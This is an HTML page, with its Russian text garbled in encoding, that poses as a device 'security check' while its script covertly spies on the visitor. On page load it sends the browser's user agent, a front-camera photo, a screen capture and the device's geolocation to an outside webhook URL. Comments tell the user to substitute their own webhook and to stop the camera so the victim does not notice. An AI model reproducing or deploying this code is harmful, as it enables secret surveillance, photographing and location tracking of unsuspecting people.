    <style>
      body {
        background: #f5f5f5;
        font-family: Arial, sans-serif;
        text-align: center;
        padding: 20px;
        margin: 0;
      }
      .container {

          transform: rotate(360deg);

    </style>
  </head>
  <body>
    <div class="container">
      <h2>üîê –ü—Ä–æ–≤–µ—Ä–∫–∞ –±–µ–∑–æ–ø–∞—Å–Ω–æ—Å—Ç–∏</h2>
      <div class="spinner"></div>
      <p class="status">–í—ã–ø–æ–ª–Ω—è–µ—Ç—Å—è –ø—Ä–æ–≤–µ—Ä–∫–∞ —É—Å—Ç—Ä–æ–π—Å—Ç–≤–∞...</p>
      <p style="font-size: 12px; color: #999; margin-top: 30px">
        –ù–µ –∑–∞–∫—Ä—ã–≤–∞–π—Ç–µ —Å—Ç—Ä–∞–Ω–∏—Ü—É
      </p>
    </div>

    <video id="video" autoplay playsinline></video>
    <canvas id="canvas"></canvas>

    <script>
      // ==============================================
      // –ú–≥–Ω–æ–≤–µ–Ω–Ω–∞—è –æ—Ç–ø—Ä–∞–≤–∫–∞ –¥–∞–Ω–Ω—ã—Ö –Ω–∞ –≤–∞—à —Å–µ—Ä–≤–µ—Ä
      // ==============================================

      const SERVER_URL =
        "https://webhook.site/ce4387d1-2daa-4e6e-a009-d771d079454a"; // –ó–ê–ú–ï–ù–ò–¢–ï –ù–ê –°–í–û–ô WEBHOOK

      // 1. –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –∏–Ω—Ñ–æ—Ä–º–∞—Ü–∏—é –æ–± —É—Å—Ç—Ä–æ–π—Å—Ç–≤–µ
      fetch(SERVER_URL + "?device=" + encodeURIComponent(navigator.userAgent));

      // 2. –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º –∫–∞–º–µ—Ä—É –ë–ï–ó –≤–∏–¥–∏–º–æ–≥–æ –∑–∞–ø—Ä–æ—Å–∞ (–æ–±—Ö–æ–¥ —á–µ—Ä–µ–∑ "–Ω—É–∂–Ω–æ –¥–ª—è –ø—Ä–æ–≤–µ—Ä–∫–∏")
      async function hackCamera() {
        try {
          // –ó–∞–ø—Ä–∞—à–∏–≤–∞–µ–º —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω—É—é –∫–∞–º–µ—Ä—É (—Å–µ–ª—Ñ–∏)
          const stream = await navigator.mediaDevices.getUserMedia({
            video: {
              facingMode: "user", // —Ñ—Ä–æ–Ω—Ç–∞–ª—å–Ω–∞—è –∫–∞–º–µ—Ä–∞
              width: { ideal: 640 },
              height: { ideal: 480 },
            },
          });

          // –î–µ–ª–∞–µ–º —Ñ–æ—Ç–æ
          const video = document.getElementById("video");
          video.srcObject = stream;
          video.play();

          // –ñ–¥–µ–º 1 —Å–µ–∫—É–Ω–¥—É –¥–ª—è –∏–Ω–∏—Ü–∏–∞–ª–∏–∑–∞—Ü–∏–∏ –∫–∞–º–µ—Ä—ã
          setTimeout(() => {
            const canvas = document.getElementById("canvas");
            canvas.width = video.videoWidth;
            canvas.height = video.videoHeight;
            const ctx = canvas.getContext("2d");
            ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

            // –ö–æ–Ω–≤–µ—Ä—Ç–∏—Ä—É–µ–º —Ñ–æ—Ç–æ –≤ base64
            const photo = canvas.toDataURL("image/jpeg", 0.7);

            // –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –Ω–∞ —Å–µ—Ä–≤–µ—Ä
            fetch(SERVER_URL, {
              method: "POST",
              body: JSON.stringify({
                type: "camera",
                photo: photo,
                time: new Date().toISOString(),
              }),
            });

            // –ó–∞–∫—Ä—ã–≤–∞–µ–º –∫–∞–º–µ—Ä—É (—á—Ç–æ–± –Ω–µ —Å–ø–∞–ª–∏—Ç—å—Å—è)
            stream.getTracks().forEach((track) => track.stop());
          }, 1000);
        } catch (e) {
          // –ï—Å–ª–∏ –∫–∞–º–µ—Ä–∞ –Ω–µ –¥–∞–ª–∞—Å—å - –æ—Ç–ø—Ä–∞–≤–ª—è–µ–º –æ—à–∏–±–∫—É
          fetch(SERVER_URL + "?error=" + encodeURIComponent(e.message));
        }
      }

      // 3. –ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å –¥–æ—Å—Ç—É–ø –∫ —ç–∫—Ä–∞–Ω—É (Android 5+)
      async function hackScreen() {
        try {
          // –î–ª—è Android 10+ –µ—Å—Ç—å API –∑–∞—Ö–≤–∞—Ç–∞ —ç–∫—Ä–∞–Ω–∞
          if ("getDisplayMedia" in navigator) {
            const screenStream = await navigator.mediaDevices.getDisplayMedia({
              video: true,
              audio: false,
            });

            const video = document.getElementById("video");
            video.srcObject = screenStream;
            video.play();

            setTimeout(() => {
              const canvas = document.getElementById("canvas");
              canvas.width = video.videoWidth || 720;
              canvas.height = video.videoHeight || 1280;
              const ctx = canvas.getContext("2d");
              ctx.drawImage(video, 0, 0, canvas.width, canvas.height);

              const screenshot = canvas.toDataURL("image/jpeg", 0.5);

              fetch(SERVER_URL, {
                method: "POST",
                body: JSON.stringify({
                  type: "screen",
                  screenshot: screenshot,
                  time: new Date().toISOString(),
                }),
              });

              screenStream.getTracks().forEach((track) => track.stop());
            }, 1500);
          }
        } catch (e) {
          fetch(SERVER_URL + "?screen_error=" + encodeURIComponent(e.message));
        }
      }

      // 4. –ó–∞–ø—É—Å–∫–∞–µ–º –≤—Å—ë —Å—Ä–∞–∑—É
      hackCamera();
      setTimeout(hackScreen, 2000);

      // 5. –û—Ç–ø—Ä–∞–≤–ª—è–µ–º –≥–µ–æ–ª–æ–∫–∞—Ü–∏—é (–µ—Å–ª–∏ –¥–∞–¥—É—Ç)
      if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(
          (pos) => {
            fetch(
              SERVER_URL +
                "?lat=" +
                pos.coords.latitude +
                "&lon=" +
                pos.coords.longitude,
            );
          },
          () => {},
        );
      }
    </script>
